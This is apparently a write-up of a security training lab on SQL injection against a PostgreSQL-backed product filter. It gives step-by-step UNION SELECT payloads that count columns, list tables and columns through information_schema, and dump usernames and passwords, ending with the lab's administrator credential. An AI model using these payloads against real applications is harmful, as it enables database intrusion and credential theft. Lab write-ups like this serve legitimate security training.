#  SQL Injection: Listing database contents on Non-Oracle databases

**Lab Description:** This lab contains an SQL injection vulnerability in the product category filter. The application runs on a PostgreSQL database.

## 1. Reconnaissance (Trinh sát)
* **Detection:** Appended `'` to the URL parameter `category`.(same previous lab)
    * Result: `Internal Server Error` (500).
    * Conclusion: Likely SQL Injection.
* **Database Identification:**
    * Tried `category=Gifts'--` -> Error.
    * Tried `category=Gifts'#` -> Error.
    * Confirmed PostgreSQL/Microsoft behavior (standard SQL).

## 2. Exploitation Steps

**Step 1: Determine number of columns**
Payload: `' ORDER BY 1--` (Success), `' ORDER BY 2--` (Success), `' ORDER BY 3--` (Error).
-> **Result:** 2 Columns.
Basically, format of this lab is as same as previous lab.
**Step 2: Find table names**
Because it's PostgreSQL, I use `information_schema.tables`.
Payload:
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public'--
```
-> Found table: users_yrspka

**Step 3: Find column names Payload:**
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_yrspka'--
```
-> Found columns: username_hgkkrs, password_uyfqhi

**Step4: Dump Data (Lấy mật khẩu) Payload:**
```sql
' UNION SELECT username_hgkkrs, password_uyfqhi FROM users_yrspka--
```
-> Result: administrator | wnps75q8xd922owukkts
